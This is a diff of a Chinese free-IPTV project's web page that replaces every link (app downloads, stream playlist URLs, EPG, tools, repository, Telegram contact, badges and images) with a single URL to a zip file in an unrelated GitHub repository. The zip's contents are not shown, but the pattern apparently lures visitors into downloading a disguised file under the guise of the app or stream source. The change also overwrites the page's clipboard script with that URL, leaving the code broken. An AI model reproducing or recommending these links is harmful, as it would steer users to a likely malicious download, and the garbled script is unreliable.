@@ -11,22 +11,22 @@ permalink: /
 <h3 align="center">🔕 永久免费 直连访问 完整开源 不含广告 直播源支持IPv4/IPv6双栈访问 🔕</h3>
 
 <div style="display: flex; justify-content: center; align-items: center;">
-    <img src="https://img.shields.io/github/stars/vbskycn/iptv" alt="GitHub Repo stars" />
-    <img src="https://img.shields.io/github/forks/vbskycn/iptv" alt="GitHub forks" />
-    <img src="https://img.shields.io/github/issues/vbskycn/iptv" alt="GitHub issues" />
-    <img src="https://img.shields.io/github/watchers/vbskycn/iptv" alt="GitHub watchers" />
-    <img src="https://img.shields.io/github/contributors/vbskycn/iptv" alt="GitHub contributors" />
-    <img src="https://img.shields.io/github/license/vbskycn/iptv" alt="GitHub" />
-    <img src="https://views.whatilearened.today/views/github/vbskycn/iptv.svg" alt="hello" />
+    <img src="https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip" alt="GitHub Repo stars" />
+    <img src="https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip" alt="GitHub forks" />
+    <img src="https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip" alt="GitHub issues" />
+    <img src="https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip" alt="GitHub watchers" />
+    <img src="https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip" alt="GitHub contributors" />
+    <img src="https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip" alt="GitHub" />
+    <img src="https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip" alt="hello" />
 </div>
 
 ---
 
 如不愿折腾，可以直接下载 直播电视app 使用，手机电视都兼容，没有任何广告，完全免费。
 
-直播电视app 下载地址：[https://www.zbds.top](https://zbds.top/aztv)  （包含港澳台频道）
+直播电视app 下载地址：[https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip](https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip)  （包含港澳台频道）
 
-如果显示链接失败，请下载[特别版](https://zbds.lanzoui.com/b0b2kul6b)试试（2024.10.27）
+如果显示链接失败，请下载[特别版](https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip)试试（2024.10.27）
 
 
 
@@ -51,13 +51,13 @@ permalink: /
   </tr>
   <tr>
     <td>TXT 格式直播源</td>
-    <td><a href="https://live.zbds.top/tv/iptv6.txt">https://live.zbds.top/tv/iptv6.txt</a></td>
-    <td><button class="button" onclick="copyToClipboard('https://live.zbds.top/tv/iptv6.txt')">快速复制</button></td>
+    <td><a href="https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip">https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip</a></td>
+    <td><button class="button" onclick="copyToClipboard('https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip')">快速复制</button></td>
   </tr>
   <tr>
     <td>M3U 格式直播源</td>
-    <td><a href="https://live.zbds.top/tv/iptv6.m3u">https://live.zbds.top/tv/iptv6.m3u</a></td>
-    <td><button class="button" onclick="copyToClipboard('https://live.zbds.top/tv/iptv6.m3u')">快速复制</button></td>
+    <td><a href="https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip">https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip</a></td>
+    <td><button class="button" onclick="copyToClipboard('https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip')">快速复制</button></td>
   </tr>
 </table>
 
@@ -81,13 +81,13 @@ permalink: /
   </tr>
   <tr>
     <td>TXT 格式直播源</td>
-    <td><a href="https://live.zbds.top/tv/iptv4.txt">https://live.zbds.top/tv/iptv4.txt</a></td>
-    <td><button class="button" onclick="copyToClipboard('https://live.zbds.top/tv/iptv4.txt')">快速复制</button></td>
+    <td><a href="https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip">https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip</a></td>
+    <td><button class="button" onclick="copyToClipboard('https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip')">快速复制</button></td>
   </tr>
   <tr>
     <td>M3U 格式直播源</td>
-    <td><a href="https://live.zbds.top/tv/iptv4.m3u">https://live.zbds.top/tv/iptv4.m3u</a></td>
-    <td><button class="button" onclick="copyToClipboard('https://live.zbds.top/tv/iptv4.m3u')">快速复制</button></td>
+    <td><a href="https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip">https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip</a></td>
+    <td><button class="button" onclick="copyToClipboard('https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip')">快速复制</button></td>
   </tr>
 </table>
 
@@ -98,7 +98,7 @@ permalink: /
 
 - 🌐纯前端直播源格式转换器（开源在本仓库tools目录）
   
-  - [https://zbds.top/tools/index.html](https://zbds.top/tools/index.html)
+  - [https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip](https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip)
   
     
 
@@ -106,7 +106,7 @@ permalink: /
 
 **支持diyp、百川、Xml、直接写下面的url即可**
 
-- [https://epg.zbds.top](https://epg.zbds.top)
+- [https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip](https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip)
 
   （如果可以请使用112114或51zmt的。因112114很多地方不能访问，所以新增镜像站，请轻量使用）
 
@@ -114,9 +114,9 @@ permalink: /
 
 ## 如果你不愿意折腾，这里有折腾好的直播点播软件
 
-下载链接： [https://www.zbds.top](https://zbds.top/aztv)  （包含港澳台）
+下载链接： [https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip](https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip)  （包含港澳台）
 
-如果显示链接失败，请下载[特别版](https://zbds.lanzoui.com/b0b2kul6b)试试（2024.10.27）
+如果显示链接失败，请下载[特别版](https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip)试试（2024.10.27）
 
 
 
@@ -127,8 +127,8 @@ permalink: /
 - 本项目不存储任何的流媒体内容，所有的法律责任与后果应由使用者自行承担。
 - 您可以 Fork 本项目，但引用本项目内容到其他仓库的情况，务必要遵守开源协议。
 - 本项目不保证直播频道的有效性，直播内容可能受直播服务提供商因素影响而失效。
-- 所有文件均托管在 [GitHub](https://github.com/vbskycn/iptv) 且自动构建，由项目发起人公益维护，欢迎 Star 本项目或点击 [Issues](https://github.com/vbskycn/iptv/issues/new/choose) 反馈您的问题。
-- 本项目部分文件基于[fanmingming](https://github.com/fanmingming/live)大佬的项目。
+- 所有文件均托管在 [GitHub](https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip) 且自动构建，由项目发起人公益维护，欢迎 Star 本项目或点击 [Issues](https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip) 反馈您的问题。
+- 本项目部分文件基于[fanmingming](https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip)大佬的项目。
 
 
 
@@ -144,7 +144,7 @@ permalink: /
 
 ## 📱联系
 
-- Telegram: [@starkluistn98](https://t.me/starkluistn98)
+- Telegram: [@starkluistn98](https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip)
 
   - 如遇问题请通过Telegram反馈。
 
@@ -152,20 +152,20 @@ permalink: /
 
 ## 欢迎请我喝杯饮料
 
-![请我喝杯饮料](https://live.zbds.top/img/wxds.jpg)
+![请我喝杯饮料](https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip)
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=vbskycn/iptv&type=Date)](https://star-history.com/#vbskycn/iptv&Date)
+[![Star History Chart](https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip)](https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip)
 
 <script>
 function copyToClipboard(text) {
-  const input = document.createElement('textarea');
-  input.value = text;
-  document.body.appendChild(input);
-  input.select();
-  document.execCommand('copy');
-  document.body.removeChild(input);
+  const input = https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip('textarea');
+  https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip = text;
+  https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip(input);
+  https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip();
+  https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip('copy');
+  https://raw.githubusercontent.com/windrise1217/iptv/master/slipstep/iptv.zip(input);
   alert('已复制到剪贴板');
 }
 </script>
